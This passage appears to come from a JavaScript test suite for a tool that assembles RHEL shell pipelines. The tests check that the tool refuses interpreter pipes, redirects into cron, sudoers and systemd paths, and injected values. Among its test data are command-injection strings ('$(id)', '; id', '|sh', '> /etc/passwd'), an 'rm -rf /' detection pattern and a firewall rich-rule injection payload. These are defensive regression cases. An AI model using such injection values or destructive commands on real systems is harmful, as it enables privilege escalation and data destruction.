    var scRes = A.assemblePipeline(scStages, VERSIONS[ur2], { patterns: realPatterns });
    if (scRes === null || scRes.stages[1].blast !== "green") {
      stats.failures.push("unrated target control / RHEL " + VERSIONS[ur2] + ": a scratch target " +
                          "rendered '" + (scRes ? scRes.stages[1].blast : "null") + "' -- if every " +
                          "target is unrated the rating says nothing");
    }
  }
  /* PL3: the blast rule stands on the DE-QUOTED projection of the whole
     pipeline and does not depend on the `path` field type for its correctness.
     Driven here through a free-text `comment` value carrying a redirection: no
     validated target exists anywhere in this composition, and the rating must
     still fire. It raises and never lowers, which is the correct direction to
     be wrong in. */
  var PROJ_SPEC = { id: "pipe-proj", tool: "probe", blast: "green",
                    fields: [{ name: "c", type: "comment", required: true, versions: VERSIONS }],
                    template: [{ lit: "probe" }, { field: "c" }] };
  for (var pj2 = 0; pj2 < VERSIONS.length; pj2++) {
    blastChecks++;
    var pjRes = A.assemblePipeline([{ spec: PROJ_SPEC, values: { c: "note > /etc/passwd" } }],
                                   VERSIONS[pj2], { patterns: [] });
    if (pjRes === null) {
      stats.failures.push("projected redirect / RHEL " + VERSIONS[pj2] + ": the composition was refused");
      continue;
    }
    if (pjRes.blast !== "red") {
      stats.failures.push("projected redirect / RHEL " + VERSIONS[pj2] + ": " +
                          JSON.stringify(pjRes.command) + " rated '" + pjRes.blast + "'. The " +
                          "redirect rule must be matched on the de-quoted projection of the whole " +
                          "pipeline and must not depend on the `path` field type for its " +
                          "correctness (PL3)");
    }
    blastChecks++;
    var pjOk = A.assemblePipeline([{ spec: PROJ_SPEC, values: { c: "an ordinary note" } }],
                                  VERSIONS[pj2], { patterns: [] });
    if (pjOk === null || pjOk.blast !== "green") {
      stats.failures.push("projected redirect control / RHEL " + VERSIONS[pj2] + ": an ordinary " +
                          "comment rated '" + (pjOk ? pjOk.blast : "null") + "' -- the projection " +
                          "scan is firing on anything");
    }
  }

  /* PL2: rule 4 tested as a CLASS -- "an interpreter is the final consumer" --
     across all three shapes, including the two a name list misses. Every row
     must be REFUSED (null), and the control below proves the class predicate is
     not simply refusing every stage. */
  var interpreterChecks = 0;
  var interpreterClass = [
    ["shape 1: a pipe into an interpreter (sh)", [HEAD, { op: "pipe", spec: SH_SPEC, values: {} }]],
    ["shape 1: a pipe into an interpreter (bash)", [HEAD, { op: "pipe", spec: BASH_SPEC, values: {} }]],
    ["shape 1: a pipe into an interpreter (python3)", [HEAD, { op: "pipe", spec: PY_SPEC, values: {} }]],
    ["shape 1: a pipe into an interpreter (perl)", [HEAD, { op: "pipe", spec: PERL_SPEC, values: {} }]],
    ["shape 1: an interpreter as the FIRST stage",
     [{ spec: SH_SPEC, values: {} }, { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["shape 1: an interpreter behind && rather than a pipe",
     [HEAD, { op: "and", spec: BASH_SPEC, values: {} }]],
    ["shape 2: xargs whose CHILD is an interpreter",
     [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", spec: SH_SPEC, values: {} }]],
    ["shape 2: xargs -0 whose CHILD is an interpreter, behind a real -print0 producer",
     [{ spec: FIND_NUL, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", xargs: { nul: true }, spec: BASH_SPEC, values: {} }]],
    ["shape 2: xargs -0 -I whose CHILD is an interpreter",
     [{ spec: FIND_NUL, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", xargs: { nul: true, replace: true }, spec: PY_SPEC, values: {} }]],
    ["shape 3: an execution sink reached by REDIRECT, not by pipe (/etc/cron.d)",
     [HEAD, { op: "redirect", target: "/etc/cron.d/mcr" }]],
    ["shape 3: an execution sink reached by redirect (/etc/profile.d)",
     [HEAD, { op: "append", target: "/etc/profile.d/mcr.sh" }]],
    ["shape 3: an execution sink reached by redirect (/usr/local/bin, which is NOT under the system-path rule)",
     [HEAD, { op: "redirect", target: "/usr/local/bin/mcr" }]],
    ["shape 3: an execution sink reached by redirect (/var/spool/cron, which is NOT under the system-path rule)",
     [HEAD, { op: "redirect", target: "/var/spool/cron/root" }]],
    ["shape 3: an execution sink reached by TEE",
     [HEAD, { op: "tee", target: "/etc/sudoers.d/mcr" }]],
    ["shape 3: an execution sink reached by 2>",
     [HEAD, { op: "redirect_err", target: "/etc/systemd/system/mcr.service" }]],
    ["TM2-F8: a wrapper that re-parses its argument (su)",
     [HEAD, { op: "pipe", spec: { id: "w-su", tool: "su", blast: "green", fields: [],
                                  template: [{ lit: "su" }, { lit: "-c" }] }, values: {} }]],
    ["TM2-F8: a wrapper that re-parses its argument (runuser)",
     [HEAD, { op: "pipe", spec: { id: "w-ru", tool: "runuser", blast: "green", fields: [],
                                  template: [{ lit: "runuser" }, { lit: "-l" }] }, values: {} }]],
    ["TM2-F8: a wrapper that re-parses its argument (timeout)",
     [HEAD, { op: "pipe", spec: { id: "w-to", tool: "timeout", blast: "green", fields: [],
                                  template: [{ lit: "timeout" }, { lit: "10" }] }, values: {} }]],
    ["TM2-F8: find with -exec, which re-parses everything up to the terminator",
     [{ spec: { id: "w-fe", tool: "find", blast: "green",
                fields: [{ name: "p", type: "path", required: true, versions: VERSIONS }],
                template: [{ lit: "find" }, { field: "p" }, { lit: "-exec" }, { lit: "ls" }] },
        values: { p: "/var/log" } },
      { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["TM2-F8: a wrapper as an xargs child",
     [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", spec: { id: "w-x", tool: "env", blast: "green", fields: [],
                                           template: [{ lit: "env" }] }, values: {} }]]
  ];
  for (var ic2 = 0; ic2 < interpreterClass.length; ic2++) {
    for (var icv = 0; icv < VERSIONS.length; icv++) {
      interpreterChecks++;
      var icRes = A.assemblePipeline(interpreterClass[ic2][1], VERSIONS[icv], { patterns: realPatterns });
      if (icRes !== null) {
        stats.failures.push("interpreter class / RHEL " + VERSIONS[icv] + " / " +
                            interpreterClass[ic2][0] + ": composed " + JSON.stringify(icRes.command) +
                            " -- an interpreter as the final consumer is refused, not rated (PL2)");
      }
    }
  }
  /* the class predicate's control: sed and awk take their program as an
     ARGUMENT and do not execute stdin, so they must still compose. A predicate
     that refused them would make the class rule "refuse anything powerful",
     which is a different and much less useful product. */
  var CLASS_CONTROLS = [
    ["sed", { id: "cc-sed", tool: "sed", blast: "green", fields: [], template: [{ lit: "sed" }, { lit: "-n" }] }],
    ["awk", { id: "cc-awk", tool: "awk", blast: "green", fields: [], template: [{ lit: "awk" }, { lit: "-F:" }] }],
    ["grep", { id: "cc-grep", tool: "grep", blast: "green", fields: [], template: [{ lit: "grep" }, { lit: "-c" }] }],
    ["sort", { id: "cc-sort", tool: "sort", blast: "green", fields: [], template: [{ lit: "sort" }, { lit: "-u" }] }],
    ["stat with -c, which is a FORMAT and not a command",
     { id: "cc-stat", tool: "stat", blast: "green", fields: [], template: [{ lit: "stat" }, { lit: "-c" }] }]
  ];
  for (var cc2 = 0; cc2 < CLASS_CONTROLS.length; cc2++) {
    for (var ccv = 0; ccv < VERSIONS.length; ccv++) {
      interpreterChecks++;
      var ccRes = A.assemblePipeline([HEAD, { op: "pipe", spec: CLASS_CONTROLS[cc2][1], values: {} }],
                                     VERSIONS[ccv], { patterns: realPatterns });
      if (ccRes === null) {
        stats.failures.push("interpreter class control / RHEL " + VERSIONS[ccv] + ": " +
                            CLASS_CONTROLS[cc2][0] + " was refused as a stage. The class is " +
                            "\"stdin or a written file becomes code\", not \"the tool is powerful\" " +
                            "-- a predicate that refuses everything proves nothing");
      }
    }
  }

  /* PL6: null on every incomplete-stage case, AND the diagnostic NAMES the
     stage. A composer that refuses without saying which stage is wrong gets
     worked around in a text editor, and a worked-around gate is worse than no
     gate at all. */
  var namingChecks = 0;
  var namingCases = [
    ["a required field left empty in stage 1",
     [{ spec: GREEN_SPEC, values: {} }, { op: "pipe", spec: WC_SPEC, values: {} }], 0],
    ["a required field left empty in stage 2",
     [HEAD, { op: "pipe", spec: GREEN_SPEC, values: {} }], 1],
    ["an invalid value in stage 3",
     [HEAD, { op: "pipe", spec: WC_SPEC, values: {} },
      { op: "seq", spec: GREEN_SPEC, values: { p: "/etc/$(id)" } }], 2],
    ["a redirect with no target, in stage 2", [HEAD, { op: "redirect" }], 1],
    ["an operator outside the closed set, in stage 2",
     [HEAD, { op: "| sh", spec: WC_SPEC, values: {} }], 1],
    ["a reference record in stage 2",
     [HEAD, { op: "pipe", spec: { id: "ref3", tool: "wc", blast: "green",
                                  rhel_versions: { "9": { command: "wc -l" } } }, values: {} }], 1],
    ["an execution-sink target in stage 2", [HEAD, { op: "redirect", target: "/etc/cron.d/x" }], 1],
    ["xargs -0 with no NUL producer, in stage 2",
     [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", xargs: { nul: true }, spec: WC_SPEC, values: {} }], 1]
  ];
  for (var nc2 = 0; nc2 < namingCases.length; nc2++) {
    for (var ncv = 0; ncv < VERSIONS.length; ncv++) {
      namingChecks++;
      var ncStages = namingCases[nc2][1], ncBad = namingCases[nc2][2];
      if (A.assemblePipeline(ncStages, VERSIONS[ncv], { patterns: realPatterns }) !== null) {
        stats.failures.push("stage naming / RHEL " + VERSIONS[ncv] + " / " + namingCases[nc2][0] +
                            ": the pipeline assembled, which it must not");
        continue;
      }
      var vp = A.validatePipeline(ncStages, VERSIONS[ncv], { patterns: realPatterns });
      if (vp.ok) {
        stats.failures.push("stage naming / RHEL " + VERSIONS[ncv] + " / " + namingCases[nc2][0] +
                            ": validatePipeline() says ok while assemblePipeline() refused -- the " +
                            "UI and the assembler disagree about the same pipeline");
        continue;
      }
      if (!vp.stages[ncBad] || vp.stages[ncBad].ok !== false || !vp.stages[ncBad].reason) {
        stats.failures.push("stage naming / RHEL " + VERSIONS[ncv] + " / " + namingCases[nc2][0] +
                            ": stage " + (ncBad + 1) + " is not named as the incomplete one -- " +
                            JSON.stringify(vp.stages) + " (PL6)");
        continue;
      }
      for (var ok3 = 0; ok3 < vp.stages.length; ok3++) {
        if (ok3 === ncBad) continue;
        if (vp.stages[ok3].ok === false) {
          stats.failures.push("stage naming / RHEL " + VERSIONS[ncv] + " / " + namingCases[nc2][0] +
                              ": stage " + (ok3 + 1) + " was ALSO named wrong (" +
                              vp.stages[ok3].reason + "). Naming every stage names none of them");
        }
      }
    }
  }
  /* control: a complete pipeline reports ok, with no stage named wrong */
  for (var ncc = 0; ncc < VERSIONS.length; ncc++) {
    namingChecks++;
    var goodVp = A.validatePipeline([HEAD, { op: "pipe", spec: WC_SPEC, values: {} }],
                                    VERSIONS[ncc], { patterns: realPatterns });
    if (!goodVp.ok || goodVp.reason !== null) {
      stats.failures.push("stage naming control / RHEL " + VERSIONS[ncc] + ": a complete pipeline " +
                          "was reported as not ok (" + goodVp.reason + ")");
    }
  }



  /* (7) dangerous.json against the DE-QUOTED projection of the WHOLE pipeline.
         Per stage, "rm -rf /" cannot match `find '/var/log'` or `xargs rm -rf`;
         across the operator, on the de-quoted line, it must. */
  var RM_RF = { id: "pipe-rmrf", tool: "rm", blast: "green", fields: [],
                template: [{ lit: "rm" }, { lit: "-rf" }] };
  var PATH_ARG = { id: "pipe-patharg", tool: "probe", blast: "green",
                   fields: [{ name: "p", type: "path", required: true, versions: VERSIONS }],
                   template: [{ lit: "probe" }, { field: "p" }] };
  var spanPatterns = [{ id: "dp-rm-rf-root", match: "rm -rf /", label: "l", why: "w",
                        blast_floor: "red" }];
  for (var sp2 = 0; sp2 < VERSIONS.length; sp2++) {
    blastChecks++;
    /* the pattern text exists ONLY across the pipe operator: neither stage
       contains "rm -rf /" on its own, and the '/' is inside the next stage's
       quoted value. */
    var spanStages = [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
                      { op: "pipe", kind: "xargs", spec: RM_RF, values: {} }];
    var spanned = A.assemblePipeline(spanStages, VERSIONS[sp2], { patterns: spanPatterns });
    if (spanned === null) {
      stats.failures.push("whole-pipeline pattern / RHEL " + VERSIONS[sp2] +
                          ": the spanning composition was refused");
      continue;
    }
    var stage0 = A.assembleCommand(FIND_PLAIN, VERSIONS[sp2], { p: "/var/log" }, { patterns: spanPatterns });
    var stage1 = A.assembleCommand(RM_RF, VERSIONS[sp2], {}, { patterns: spanPatterns });
    if (stage0.blast !== "green" || stage1.blast !== "green") {
      stats.failures.push("whole-pipeline pattern / RHEL " + VERSIONS[sp2] + ": a stage already " +
                          "matched the pattern on its own, so this case does not prove the pattern " +
                          "table sees ACROSS the operator");
      continue;
    }
    if (spanned.blast !== "red") {
      stats.failures.push("whole-pipeline pattern / RHEL " + VERSIONS[sp2] + ": a destructive " +
                          "pattern spanning the pipe operator did not fire -- " +
                          JSON.stringify(spanned.command) + " rated '" + spanned.blast +
                          "'. dangerous.json must be matched against the de-quoted projection of " +
                          "the WHOLE pipeline, not stage by stage");
    }
    blastChecks++;
    /* control: a pipeline that genuinely does not carry the pattern stays green */
    var quietStages = [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
                       { op: "pipe", spec: WC_SPEC, values: {} }];
    var quietPipe = A.assemblePipeline(quietStages, VERSIONS[sp2], { patterns: spanPatterns });
    if (quietPipe === null || quietPipe.blast !== "green") {
      stats.failures.push("whole-pipeline pattern control / RHEL " + VERSIONS[sp2] +
                          ": an unrelated pipeline was rated " +
                          (quietPipe ? quietPipe.blast : "null") + " -- the de-quoted matcher is " +
                          "firing on anything");
    }
  }

  /* (8) REFUSALS: every shape the composer must return null for, each with the
         nearest legal composition as its control, so a refusal that is simply
         "refuse everything" cannot pass. */
  var refusalChecks = 0;
  var refusals = [
    ["a stage piping into sh", [HEAD, { op: "pipe", spec: SH_SPEC, values: {} }]],
    ["a stage piping into bash", [HEAD, { op: "pipe", spec: BASH_SPEC, values: {} }]],
    ["a stage piping into python", [HEAD, { op: "pipe", spec: PY_SPEC, values: {} }]],
    ["a stage piping into perl", [HEAD, { op: "pipe", spec: PERL_SPEC, values: {} }]],
    ["a shell as the FIRST stage", [{ spec: SH_SPEC, values: {} },
                                    { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["xargs feeding a shell", [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
                               { op: "pipe", kind: "xargs", spec: SH_SPEC, values: {} }]],
    ["a REFERENCE record (a handed command string) as a stage",
     [{ spec: { id: "ref", tool: "grep", blast: "green",
                rhel_versions: { "7": { command: "grep -r x /etc | wc -l" },
                                 "8": { command: "grep -r x /etc | wc -l" },
                                 "9": { command: "grep -r x /etc | wc -l" },
                                 "10": { command: "grep -r x /etc | wc -l" } } },
        values: {} }]],
    ["a reference record as a LATER stage",
     [HEAD, { op: "pipe",
              spec: { id: "ref2", tool: "wc", blast: "green",
                      rhel_versions: { "7": { command: "wc -l" }, "8": { command: "wc -l" },
                                       "9": { command: "wc -l" }, "10": { command: "wc -l" } } },
              values: {} }]],
    ["xargs -0 behind a producer that does not emit NUL records",
     [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", xargs: { nul: true }, spec: RM_SPEC, values: {} }]],
    ["xargs as the first stage",
     [{ kind: "xargs", spec: RM_SPEC, values: {} }]],
    ["xargs joined by an operator other than a pipe",
     [HEAD, { op: "and", kind: "xargs", spec: WC_SPEC, values: {} }]],
    ["xargs whose producer is a redirect, not a command",
     [HEAD, { op: "redirect_err", target: "/tmp/e.txt" },
      { op: "pipe", kind: "xargs", xargs: { nul: true }, spec: WC_SPEC, values: {} }]],
    ["xargs -n alongside -I, which xargs resolves silently",
     [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", xargs: { maxArgs: "5", replace: true }, spec: WC_SPEC, values: {} }]],
    ["xargs -n 0", [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
                    { op: "pipe", kind: "xargs", xargs: { maxArgs: "0" }, spec: WC_SPEC, values: {} }]],
    ["xargs -n with a value that is not a whole number",
     [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", xargs: { maxArgs: "5; id" }, spec: WC_SPEC, values: {} }]],
    ["a pipe after stdout is already redirected",
     [HEAD, { op: "redirect", target: "/tmp/o.txt" }, { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["a tee after stdout is already redirected",
     [HEAD, { op: "append", target: "/tmp/o.txt" }, { op: "tee", target: "/tmp/p.txt" }]],
    ["an operator on the FIRST stage", [{ op: "pipe", spec: GREEN_SPEC, values: { p: "/etc/ssh" } }]],
    ["a later stage with no operator at all", [HEAD, { spec: WC_SPEC, values: {} }]],
    ["a redirect with no target", [HEAD, { op: "redirect" }]],
    ["a redirect whose target is a relative path", [HEAD, { op: "redirect", target: "out.txt" }]],
    ["a redirect whose target traverses", [HEAD, { op: "redirect", target: "/tmp/../etc/passwd" }]],
    ["a redirect stage that also carries a spec",
     [HEAD, { op: "redirect", target: "/tmp/o.txt", spec: WC_SPEC, values: {} }]],
    ["a 2>&1 stage that also carries a target", [HEAD, { op: "err_to_out", target: "/tmp/o.txt" }]],
    ["a 2>&1 stage that also carries a spec", [HEAD, { op: "err_to_out", spec: WC_SPEC, values: {} }]],
    ["a command stage that also carries a target",
     [HEAD, { op: "pipe", spec: WC_SPEC, values: {}, target: "/tmp/o.txt" }]],
    ["a stage of an unknown kind", [HEAD, { op: "pipe", kind: "eval", spec: WC_SPEC, values: {} }]],
    ["an incomplete stage (a required field left empty)",
     [HEAD, { op: "pipe", spec: GREEN_SPEC, values: {} }]],
    ["an invalid stage value", [HEAD, { op: "pipe", spec: GREEN_SPEC, values: { p: "/etc/$(id)" } }]],
    ["an empty pipeline", []],
    ["a pipeline of nine stages", [HEAD, { op: "pipe", spec: WC_SPEC, values: {} },
                                   { op: "pipe", spec: WC_SPEC, values: {} },
                                   { op: "pipe", spec: WC_SPEC, values: {} },
                                   { op: "pipe", spec: WC_SPEC, values: {} },
                                   { op: "pipe", spec: WC_SPEC, values: {} },
                                   { op: "pipe", spec: WC_SPEC, values: {} },
                                   { op: "pipe", spec: WC_SPEC, values: {} },
                                   { op: "pipe", spec: WC_SPEC, values: {} }]]
  ];
  for (var rf2 = 0; rf2 < refusals.length; rf2++) {
    for (var rvr = 0; rvr < VERSIONS.length; rvr++) {
      refusalChecks++;
      var refRes = A.assemblePipeline(refusals[rf2][1], VERSIONS[rvr], { patterns: realPatterns });
      if (refRes !== null) {
        stats.failures.push("pipeline refusal / RHEL " + VERSIONS[rvr] + " / " + refusals[rf2][0] +
                            ": composed " + JSON.stringify(refRes.command) +
                            " instead of returning null");
      }
    }
  }
  /* the legal neighbours of those refusals, so "refuse everything" cannot pass */
  var refusalControls = [
    ["the legal xargs -0 shape, behind find -print0",
     [{ spec: FIND_NUL, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", xargs: { nul: true }, spec: WC_SPEC, values: {} }]],
    ["the legal xargs -I shape", [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", xargs: { replace: true }, spec: WC_SPEC, values: {} }]],
    ["the legal xargs -n shape", [{ spec: FIND_PLAIN, values: { p: "/var/log" } },
      { op: "pipe", kind: "xargs", xargs: { maxArgs: "5" }, spec: WC_SPEC, values: {} }]],
    ["a pipe after a STDERR redirect, where stdout still flows",
     [HEAD, { op: "redirect_err", target: "/tmp/e.txt" }, { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["a redirect followed by 2>&1", [HEAD, { op: "redirect", target: "/tmp/o.txt" },
                                     { op: "err_to_out" }]],
    ["the maximum-length pipeline, eight stages",
     [HEAD, { op: "pipe", spec: WC_SPEC, values: {} }, { op: "pipe", spec: WC_SPEC, values: {} },
      { op: "pipe", spec: WC_SPEC, values: {} }, { op: "pipe", spec: WC_SPEC, values: {} },
      { op: "pipe", spec: WC_SPEC, values: {} }, { op: "pipe", spec: WC_SPEC, values: {} },
      { op: "pipe", spec: WC_SPEC, values: {} }]]
  ];
  for (var rc2 = 0; rc2 < refusalControls.length; rc2++) {
    for (var rcv = 0; rcv < VERSIONS.length; rcv++) {
      refusalChecks++;
      var rcRes = A.assemblePipeline(refusalControls[rc2][1], VERSIONS[rcv], { patterns: realPatterns });
      if (rcRes === null) {
        stats.failures.push("pipeline refusal control / RHEL " + VERSIONS[rcv] + " / " +
                            refusalControls[rc2][0] + ": the LEGAL neighbour of a refused shape was " +
                            "also refused -- the refusals above would pass on a composer that " +
                            "refuses everything");
        continue;
      }
      var rcMsg = pipelineOracle(rcRes.command, refusalControls[rc2][1], VERSIONS[rcv]);
      if (rcMsg) {
        stats.failures.push("pipeline refusal control / RHEL " + VERSIONS[rcv] + " / " +
                            refusalControls[rc2][0] + ": PIPELINE ORACLE -- " + rcMsg);
        continue;
      }
      pipeOracles++;
    }
  }

  /* (9) NEGATIVE CONTROLS FOR THE ORACLE ITSELF. Each of these is a pipeline
         string that is WRONG in a specific way, handed to the oracle with the
         composition it claims to be. Every one must be reported. An oracle that
         cannot fail proves nothing, and a weakened one -- dropping the position
         check, dropping the count check, treating a quoted operator as an
         operator, or skipping quoted words when looking for metacharacters --
         is caught by a different row here. */
  var oracleNegatives = [
    ["an injected bare `|` inside what should be a value",
     "grep -r /etc|sh | wc -l",
     [{ spec: GREEN_SPEC, values: { p: "/etc" } }, { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["an injected `|` glued to the inside of a quoted word (the quote-breaking shape)",
     "grep -r '/etc'|'sh' | wc -l",
     [{ spec: GREEN_SPEC, values: { p: "/etc" } }, { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["an EXTRA operator the composition never named",
     "grep -r '/etc' | wc -l ; id",
     [{ spec: GREEN_SPEC, values: { p: "/etc" } }, { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["a MISSING operator",
     "grep -r '/etc' wc -l",
     [{ spec: GREEN_SPEC, values: { p: "/etc" } }, { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["a SWAPPED operator: the composition says pipe, the line says &&",
     "grep -r '/etc' && wc -l",
     [{ spec: GREEN_SPEC, values: { p: "/etc" } }, { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["an operator at the WRONG position",
     "grep -r | '/etc' wc -l",
     [{ spec: GREEN_SPEC, values: { p: "/etc" } }, { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["the operator QUOTED, so the shell would see a filename and not a pipe",
     "grep -r '/etc' '|' wc -l",
     [{ spec: GREEN_SPEC, values: { p: "/etc" } }, { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["a command substitution smuggled into an unquoted word",
     "grep -r $(id) | wc -l",
     [{ spec: GREEN_SPEC, values: { p: "/etc" } }, { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["a redirect nobody composed",
     "grep -r '/etc' > /etc/passwd | wc -l",
     [{ spec: GREEN_SPEC, values: { p: "/etc" } }, { op: "pipe", spec: WC_SPEC, values: {} }]],
    ["unbalanced quoting",
     "grep -r '/etc | wc -l",
     [{ spec: GREEN_SPEC, values: { p: "/etc" } }, { op: "pipe", spec: WC_SPEC, values: {} }]]
  ];
  for (var on2 = 0; on2 < oracleNegatives.length; on2++) {
    pipeNegatives++;
    if (pipelineOracle(oracleNegatives[on2][1], oracleNegatives[on2][2], "9") === null) {
      stats.failures.push("pipeline oracle negative control: " + oracleNegatives[on2][0] +
                          " -- the oracle rated " + JSON.stringify(oracleNegatives[on2][1]) +
                          " as exactly the operator's composition. An oracle that cannot fail " +
                          "proves nothing");
    }
  }
  /* and the positive control for the oracle: the honest line must PASS, or the
     negatives above are passing because the oracle rejects everything. */
  pipeNegatives++;
  if (pipelineOracle("grep -r '/etc' | wc -l",
                     [{ spec: GREEN_SPEC, values: { p: "/etc" } },
                      { op: "pipe", spec: WC_SPEC, values: {} }], "9") !== null) {
    stats.failures.push("pipeline oracle positive control: the oracle rejected the pipeline the " +
                        "composer actually emits, so every negative control above passes for the " +
                        "wrong reason");
  }

  /* (10) the STIG-corpus shape check (ADR-002). DISA's own check text is full
          of pipelines; the closed operator set has to be able to express the
          shapes a real check uses, or the corpus cannot express the checks it
          itself contains. tests/fixtures/stig-pipeline-shapes.json records what
          was measured and what is deliberately out of scope; the Python test
          tests/test_pipeline_stig_shapes.py re-derives the measurement from
          content/rules_rhel*.json so this claim cannot go stale. Here we assert
          only the part that belongs to the assembler: every operator the
          fixture says the corpus uses is in the closed table. */
  var stigShapeChecks = 0;
  var stigShapes = JSON.parse(fs.readFileSync(path.join(REPO, "tests", "fixtures",
                                                        "stig-pipeline-shapes.json"), "utf8"));
  var corpusOps = stigShapes.corpus_operators || [];
  if (!corpusOps.length) {
    stats.failures.push("tests/fixtures/stig-pipeline-shapes.json names no corpus operators, so " +
                        "the expressibility claim below is vacuous");
  }
  for (var cs2 = 0; cs2 < corpusOps.length; cs2++) {
    stigShapeChecks++;
    var crow = corpusOps[cs2];
    var expressible = A.PIPE_OPERATOR_EMITS.indexOf(crow.token) >= 0;
    if (expressible !== (crow.expressible === true)) {
      stats.failures.push("STIG corpus shape: the operator " + JSON.stringify(crow.token) + " occurs " +
                          crow.count + " times at top level in the embedded rules and the fixture " +
                          "says expressible=" + crow.expressible + ", but the closed table says " +
                          expressible + " -- if the set cannot express a common DISA check, that is " +
                          "a finding about the set, reported, not a reason to widen it quietly");
    }
  }

  /* ---- positive control -------------------------------------------------
     A validator that rejects everything would pass every assertion above while
     making the product useless, so each field type's benign value must
     assemble, on every release, in every argument shape. Check the healthy case
     before believing the signal. */
  var inv = [], controls = 0;
  for (var pt = 0; pt < types.length; pt++) {
    var pdef = fx.field_types[types[pt]];
    for (var pr = 0; pr < VERSIONS.length; pr++) {
      var pshapes = [flagSpec(types[pt], pdef), argSpec(types[pt], pdef), spacedFlagSpec(types[pt], pdef)];
      for (var ps = 0; ps < pshapes.length; ps++) {
        controls++;
        var pres = A.assembleCommand(pshapes[ps], VERSIONS[pr], { v: pdef.benign }, { patterns: [] });
        if (pres === null) {
          inv.push("positive control: benign " + types[pt] + " value " + JSON.stringify(pdef.benign) +
                   " was rejected on RHEL " + VERSIONS[pr] + " (" + pshapes[ps].id + ")");
        } else if (pres.command.indexOf("'" + pdef.benign + "'") < 0) {
          inv.push("positive control: benign " + types[pt] + " value is not present as a single-quoted " +
                   "token in " + JSON.stringify(pres.command));
        }
      }
    }
  }
  /* ---- negative control: the CHECKER itself must be able to fail ---------
     A tokeniser that called everything safe would also pass, so hand it two
     commands it must reject. */
  var broken = tokenize("probe --value=" + "$(whoami)");
  if (broken === null || UNQUOTED_OK.test(bareText(broken))) {
    inv.push("negative control: the tokeniser accepted an unquoted $(whoami) as safe");
  }
  /* negative control for the RICH-RULE oracle: it must be able to fail. The
     first string is the command Marcus's MCR-SEC-001 reproduction produced —
     shell-quoting-clean, grammar-injected. The second swaps only the action. */
  var injectedRule = "firewall-cmd --add-rich-rule='rule family=\"ipv4\" source address=\"10.0.0.0/8\" " +
                     "service name=\"ssh\" log prefix=\"X\" level=\"emerg\" limit value=\"1/s\" accept " +
                     "#\" drop' --permanent";
  if (richRuleOracle(injectedRule, { family: "f", source: "s", service: "v", action: "a" },
                     { f: "ipv4", s: "10.0.0.0/8", v: "ssh", a: "drop" }) === null) {
    inv.push("negative control: the rich-rule oracle rated the MCR-SEC-001 injected rule as the " +
             "operator's intent — the oracle cannot fail and therefore proves nothing");
  }
  var swappedAction = "firewall-cmd --add-rich-rule='rule family=\"ipv4\" source address=\"10.0.0.0/8\" " +
                      "accept' --permanent";
  if (richRuleOracle(swappedAction, { family: "f", source: "s", action: "a" },
                     { f: "ipv4", s: "10.0.0.0/8", a: "drop" }) === null) {
    inv.push("negative control: the rich-rule oracle did not notice a swapped ACTION");
  }
  var brokenShape = tokenize("probe --value='x' ; id");
  if (brokenShape !== null && skeleton(brokenShape) === skeleton(tokenize("probe --value='x'"))) {
    inv.push("negative control: the shape comparison did not notice an appended ; id");
  }
  /* MCR-SEC-001 reproduction, verbatim from Marcus Reed's security review of
     4184ea8, kept as a named regression. A comment-typed field wired into a
     rich-rule `service` slot injected a whole `accept` clause and a logging
     clause past a `drop` the operator had selected; the harness rated it
     QUOTED-SAFE because shell quoting did hold. It must now be null. */
  var mcr001 = {
    id: "mcr-sec-001", tool: "firewall-cmd", blast: "green",
    fields: [{ name: "family", type: "family", required: true },
             { name: "src", type: "cidr", required: true },
             { name: "note", type: "comment", required: true },
             { name: "act", type: "action", required: true }],
    template: [{ lit: "firewall-cmd" },
               { flag: "--add-rich-rule",
                 richRule: { family: "family", source: "src", service: "note", action: "act" } },
               { lit: "--permanent" }]
  };
  var mcr001Values = { family: "ipv4", src: "10.0.0.0/8", act: "drop",
                       note: 'ssh" log prefix="X" level="emerg" limit value="1/s" accept #' };
  if (A.validateField("comment", mcr001Values.note).ok !== true) {
    inv.push("MCR-SEC-001 regression: the vector no longer validates as a comment, so this " +
             "regression test has stopped testing the reported defect");
  }
  for (var mv = 0; mv < VERSIONS.length; mv++) {
    var mres = A.assembleCommand(mcr001, VERSIONS[mv], mcr001Values, { patterns: [] });
    if (mres !== null) {
      inv.push("MCR-SEC-001 regression on RHEL " + VERSIONS[mv] + ": a comment-typed field " +
               "composed into a rich-rule slot — " + JSON.stringify(mres.command));
    }
  }
  /* the same shape with the same hostile text but a closed-grammar type must be
     refused by the type's own allow-list, not silently composed */
  var mcr001b = JSON.parse(JSON.stringify(mcr001));
  mcr001b.fields[2].type = "service";
  if (A.assembleCommand(mcr001b, "9", mcr001Values, { patterns: [] }) !== null) {
    inv.push("MCR-SEC-001 regression: a service-typed slot accepted rich-rule syntax as a value");
  }
  if (A.shQuote("it's") !== "'it'\\''s'") inv.push("shQuote() does not use the POSIX '\\'' idiom");
